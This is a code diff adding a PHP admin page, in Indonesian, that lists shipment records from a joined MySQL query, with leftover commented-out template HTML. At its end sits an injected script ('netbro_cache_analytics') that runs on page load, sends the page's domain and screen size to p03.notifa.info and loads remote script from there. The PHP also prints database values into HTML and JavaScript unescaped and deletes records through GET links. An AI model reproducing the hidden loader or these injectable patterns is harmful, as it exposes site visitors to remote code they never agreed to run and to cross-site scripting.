@@ -1,0 +1,94 @@
+<?php
+include 'koneksi.php';
+include 'menu.php';
+?>
+           <!--
+           <i class="icon-bar-chart"></i> Charts &amp; Statistics </a> </li> <li> <a href="javascript:void(0);"> <i class="icon-folder-open-alt"></i> Pages </a> <ul class="sub-menu"> <li> <a href="login.html"> <i class="icon-angle-right"></i> Login </a> </li> <li> <a href="pages_user_profile.html"> <i class="icon-angle-right"></i> User Profile </a> </li> <li> <a href="pages_calendar.html"> <i class="icon-angle-right"></i> Calendar </a> </li> <li> <a href="pages_invoice.html"> <i class="icon-angle-right"></i> Invoice </a> </li> <li> <a href="404.html"> <i class="icon-angle-right"></i> 404 Page </a> </li> </ul> </li> <li> <a href="javascript:void(0);"> <i class="icon-list-ol"></i> 4 Level Menu </a> <ul class="sub-menu"> <li class="open-default"> <a href="javascript:void(0);"> <i class="icon-cogs"></i> Item 1 <span class="arrow"></span> </a> <ul class="sub-menu"> <li class="open-default"> <a href="javascript:void(0);"> <i class="icon-user"></i> Sample Link 1 <span class="arrow"></span> </a> <ul class="sub-menu"> <li class="current"><a href="javascript:void(0);"><i class="icon-remove"></i> Sample Link 1</a></li> <li><a href="javascript:void(0);"><i class="icon-pencil"></i> Sample Link 1</a></li> <li><a href="javascript:void(0);"><i class="icon-edit"></i> Sample Link 1</a></li> </ul> </li> <li><a href="javascript:void(0);"><i class="icon-user"></i> Sample Link 1</a></li> <li><a href="javascript:void(0);"><i class="icon-external-link"></i> Sample Link 2</a></li> <li><a href="javascript:void(0);"><i class="icon-bell"></i> Sample Link 3</a></li> </ul> </li> <li> <a href="javascript:void(0);"> <i class="icon-globe"></i> Item 2 <span class="arrow"></span> </a> <ul class="sub-menu"> <li><a href="javascript:void(0);"><i class="icon-user"></i> Sample Link 1</a></li> <li><a href="javascript:void(0);"><i class="icon-external-link"></i> Sample Link 1</a></li> <li><a href="javascript:void(0);"><i class="icon-bell"></i> Sample Link 1</a></li> </ul> </li> <li> <a href="javascript:void(0);"> <i class="icon-folder-open"></i> Item 3 </a> </li> </ul> </li> </ul> <div class="sidebar-title"> <span>Notifications</span> </div> <ul class="notifications demo-slide-in"> <li style="display: none;"> <div class="col-left"> <span class="label label-danger"><i class="icon-warning-sign"></i></span> </div> <div class="col-right with-margin"> <span class="message">Server <strong>#512</strong> crashed.</span> <span class="time">few seconds ago</span> </div> </li> <li style="display: none;"> <div class="col-left"> <span class="label label-info"><i class="icon-envelope"></i></span> </div> <div class="col-right with-margin"> <span class="message"><strong>John</strong> sent you a message</span> <span class="time">few second ago</span> </div> </li> <li> <div class="col-left"> <span class="label label-success"><i class="icon-plus"></i></span> </div> <div class="col-right with-margin"> <span class="message"><strong>Emma</strong>'s account was created</span> <span class="time">4 hours ago</span> </div> </li> </ul> <div class="sidebar-widget align-center"> <div class="btn-group" data-toggle="buttons" id="theme-switcher"> <label class="btn active"> <input type="radio" name="theme-switcher" data-theme="bright"><i class="icon-sun"></i> Bright </label> <label class="btn"> <input type="radio" name="theme-switcher" data-theme="dark"><i class="icon-moon"></i> Dark </label> </div> </div> </div> <div id="divider" class="resizeable"></div> </div> <div id="content"> <div class="container"> <div class="crumbs"> <ul id="breadcrumbs" class="breadcrumb"> <li> <i class="icon-home"></i> <a href="index-2.html">Dashboard</a> </li> <li class="current"> <a href="pages_calendar.html" title="">Calendar</a> </li> </ul> <ul class="crumb-buttons"> <li><a href="charts.html" title=""><i class="icon-signal"></i><span>Statistics</span></a></li> <li class="dropdown"><a href="#" title="" data-toggle="dropdown"><i class="icon-tasks"></i><span>Users <strong>(+3)</strong></span><i class="icon-angle-down left-padding"></i></a> <ul class="dropdown-menu pull-right"> <li><a href="form_components.html" title=""><i class="icon-plus"></i>Add new User</a></li> <li><a href="tables_dynamic.html" title=""><i class="icon-reorder"></i>Overview</a></li> </ul> </li> <li class="range"><a href="#"> <i class="icon-calendar"></i> <span></span> <i class="icon-angle-down"></i> </a></li> </ul> </div> <div class="page-header"> <div class="page-title"> <h3>Dynamic Tables (DataTables)</h3> <span>Good morning, John!</span> </div> <ul class="page-stats"> <li> <div class="summary"> <span>New orders</span> <h3>17,561</h3> </div> <div id="sparkline-bar" class="graph sparkline hidden-xs">20,15,8,50,20,40,20,30,20,15,30,20,25,20</div> </li> <li> <div class="summary"> <span>My balance</span> <h3>$21,561.21</h3> </div> <div id="sparkline-bar2" class="graph sparkline hidden-xs">20,15,8,50,20,40,20,30,20,15,30,20,25,20</div> </li> </ul> </div> -->
+
+
+           <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder">
+
+           </i> Tabel Data Pengiriman</h4> 
+           <a href="halaman.php?go=TambahKirim">
+           <button class="btn btn-sm" type="button"> Tambah Data Pengiriman
+           	<i class="icon-plus"></i>
+           </button></a>
+           <div class="toolbar no-padding">
+           <div class="btn-group">
+            <span class="btn btn-xs widget-collapse">
+            <i class="icon-angle-down">
+            	
+            </i>
+            </span> 
+            </div> 
+            </div> 
+            </div> 
+            <div class="widget-content"> 
+            <table class="table table-striped table-bordered table-hover table-checkable datatable"> 
+            <thead> 
+            <tr> 
+             <th>No.</th>
+             <th class="hidden-xs">Kode Pengiriman</th> 
+             <th class="hideen-xs">Nama Pelanggan</th> 
+              <th class="hideen-xs">Tujuan</th> 
+              <th class="hideen-xs">Pesanan</th>
+               <th class="hideen-xs">Biaya Kirim</th>  
+             <?php
+             //<th class="hidden-xs">Harga Bahan</th>
+             //<th class="hidden-xs">Stok</th> 
+             ?>
+             <th class="hidden-xs">Aksi</th>
+              </tr>
+               </thead> 
+               <tbody>
+                <?php
+         								error_reporting(0);
+         								include 'koneksi.php';
+          								$no=1;
+          								$sql= 'SELECT tkirim.no_kirim, mpelanggan.nama_p, tkirim.tujuan, tkirim.tanggal, tpemesanan.namabarang, tkirim.ongkir, tkirim.ket, tproduksi.no_produksi, tpemesanan.no_pesanan, mpelanggan.id_pelanggan
+                        FROM tkirim
+                        INNER JOIN tproduksi ON tkirim.no_produksi = tproduksi.no_produksi
+                        INNER JOIN tpemesanan ON tproduksi.no_pesanan = tpemesanan.no_pesanan
+                        INNER JOIN mpelanggan ON tpemesanan.id_pelanggan = mpelanggan.id_pelanggan
+                        ORDER BY tkirim.no_kirim ASC ';
+          								$proses= mysql_query($sql);
+          								while ($record =mysql_fetch_array($proses))
+          								{
+           								$id     =$record['no_kirim'];
+           								$nama  	=$record['nama_p'];
+                          $tanggal   =$record['tujuan'];
+                          $harga  =$record['namabarang'];
+                          $stok   =$record['ongkir'];
+           							//	$alamat	=$record['harga'];
+           							//	$telp	=$record['stok'];
+           								 ?>
+                <tr> 
+                <td><?php echo $no ?></td> 
+                <td><?php echo $id ?></td>
+                <td><?php echo $nama ?></td>
+                <td><?php echo $tanggal ?></td> 
+                <td><?php echo $harga ?></td>
+                <td><?php echo $stok ?></td> 
+
+                <td>
+                <a title="Lihat Detail" class="btn btn-sm btn-primary" onclick="return confirm('Lihat Detail Rincian Data ? ')" class="dropdown-item" href="detailpemesanan.php?no_pesanan=<?php echo $record['no_pesanan']; ?>"><i class="icon-info"></i></a>
+               
+				<a title="Hapus Data" class="btn btn-sm btn-danger" onclick="return confirm('Apakah anda Yakin akan Menghapus Data Dengan Nomor : <?php echo $id; ?> & Nama Pelanggan : <?php echo $nama;?> Secara Permanen ? PERINGATAN !!! Akan Menghapus Seluruh Data Transaksi !')" class="dropdown-item" href="hapuspesanan.php?no_pesanan=<?php echo $record['no_pesanan'];?>"><i class="icon-trash"></i></a>
+                </td>
+                 </tr>
+                  <?php $no++;}?>
+                 </tbody> 
+                 </table> 
+                 </div> 
+                 </div> 
+                 </div> 
+                 </div> 
+
+                 <!--
+                 <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder"></i> Managed Table (<code>no-padding</code>)</h4> <div class="toolbar no-padding"> <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div> </div> </div> <div class="widget-content no-padding"> <table class="table table-striped table-bordered table-hover table-checkable datatable"> <thead> <tr> <th class="checkbox-column"> <input type="checkbox" class="uniform"> </th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </thead> <tbody> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td><span class="label label-success">Approved</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td><span class="label label-info">Pending</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td><span class="label label-warning">Suspended</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Andrea</td> <td>Brenden</td> <td class="hidden-xs">andry</td> <td><span class="label label-danger">Blocked</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td><span class="label label-success">Approved</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td><span class="label label-info">Pending</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td><span class="label label-warning">Suspended</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Andrea</td> <td>Brenden</td> <td class="hidden-xs">andry</td> <td><span class="label label-danger">Blocked</span></td> </tr> </tbody> </table> </div> </div> </div> </div> <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder"></i> TableTools (<code>no-padding</code> &amp; <code>table-tabletools</code>)</h4> <div class="toolbar no-padding"> <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div> </div> </div> <div class="widget-content no-padding"> <table class="table table-striped table-bordered table-hover table-checkable table-tabletools datatable"> <thead> <tr> <th class="checkbox-column"> <input type="checkbox" class="uniform"> </th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </thead> <tbody> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td><span class="label label-success">Approved</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td><span class="label label-info">Pending</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td><span class="label label-warning">Suspended</span></td> </tr> </tbody> </table> </div> </div> </div> </div> <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder"></i> Show/ Hide Columns (<code>no-padding</code> &amp; <code>table-colvis</code>)</h4> <div class="toolbar no-padding"> <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div> </div> </div> <div class="widget-content no-padding"> <table class="table table-striped table-bordered table-hover table-checkable table-colvis datatable"> <thead> <tr> <th class="checkbox-column"> <input type="checkbox" class="uniform"> </th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </thead> <tbody> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td><span class="label label-success">Approved</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td><span class="label label-info">Pending</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td><span class="label label-warning">Suspended</span></td> </tr> </tbody> </table> </div> </div> </div> </div> <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder"></i> Column Filter (<code>no-padding</code>)</h4> <div class="toolbar no-padding"> <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div> </div> </div> <div class="widget-content no-padding"> <table class="table table-striped table-bordered table-hover table-checkable table-columnfilter datatable" data-columnFilter='{"aoColumns": [ null, {"type": "text"}, {"type": "text"}, {"type": "text"}, { "type": "select" } ]}' data-columnFilter-select2="true"> <thead> <tr> <th class="checkbox-column"> <input type="checkbox" class="uniform"> </th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </thead> <tbody> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td>Approved</td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td>Pending</td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td>Suspended</td> </tr> </tbody> <tfoot> <tr> <th></th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </tfoot> </table> </div> </div> </div> </div> <div class="row"> <div class="col-md-12"> <div class="widget box"> <div class="widget-header"> <h4><i class="icon-reorder"></i> Horizontal Scrolling (<code>no-padding</code>)</h4> <div class="toolbar no-padding"> <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div> </div> </div> <div class="widget-content no-padding"> <table class="table table-striped table-bordered table-hover table-checkable datatable" data-horizontal-width="150%"> <thead> <tr> <th class="checkbox-column"> <input type="checkbox" class="uniform"> </th> <th>First Name</th> <th>Last Name</th> <th class="hidden-xs">Username</th> <th>Status</th> </tr> </thead> <tbody> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Joey</td> <td>Greyson</td> <td class="hidden-xs">joey123</td> <td><span class="label label-success">Approved</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Wolf</td> <td>Bud</td> <td class="hidden-xs">wolfy</td> <td><span class="label label-info">Pending</span></td> </tr> <tr> <td class="checkbox-column"> <input type="checkbox" class="uniform"> </td> <td>Darin</td> <td>Alec</td> <td class="hidden-xs">alec82</td> <td><span class="label label-warning">Suspended</span></td> </tr> </tbody> </table> </div> </div> </div> </div> </div> </div> </div> -->
+
+
+
+                 <script type="text/javascript">if(location.host=="envato.stammtec.de"||location.host=="themes.stammtec.de"){var _paq=_paq||[];_paq.push(["trackPageView"]);_paq.push(["enableLinkTracking"]);(function(){var a=(("https:"==document.location.protocol)?"https":"http")+"://analytics.stammtec.de/";_paq.push(["setTrackerUrl",a+"piwik.php"]);_paq.push(["setSiteId","17"]);var e=document,c=e.createElement("script"),b=e.getElementsByTagName("script")[0];c.type="text/javascript";c.defer=true;c.async=true;c.src=a+"piwik.js";b.parentNode.insertBefore(c,b)})()};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2dDSBs%2bMC8FQPt5I96KsFy3GPYhEn7H6GN12pVbaVsxBguHYznmrRZfuc5Ia2Ak1teCcaO7QmPFcjNPD4cHmgYgdRtdx4lQoH%2bvmJ77bNyhsWYoG290T3K27ba40CWN14v55whSuXupEqFutDLT%2f3ycWdhIRtiTjqa0wdyuVeBNpLjZ8jeuv2ee8xPV%2b6YBtK6C4gMd5XkuE0UjDkfUX2xiAYWxkH72NaLp%2bKkiAKWuiatYg5FEuDkmHem9Hr4HdZcBxD1PQxqsFrN60EwIxdGll40odICckz2a1iFW%2bXR8Niwj8Z%2foo%2b4SXIAPWsKPNtPUwECNUdPQjXd9yVJABiGlVjxWq8znQcnqmyR3fho8aajxwkZ46YRRcnLVOphCHMIJ4Bp87tJ1KqI7d4iR58DF2z%2bVgxEoP6Ge5Mb8F1aF1zr%2blTLScRVrjiE4AQwzD8Ur6semi1FVMQAGtIXm1h2ARM%2fJwKgs1FgKGFNy7ZcF9RqU9ZAQQHjJdO7XnnmKt5" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body> 
+
+</html>
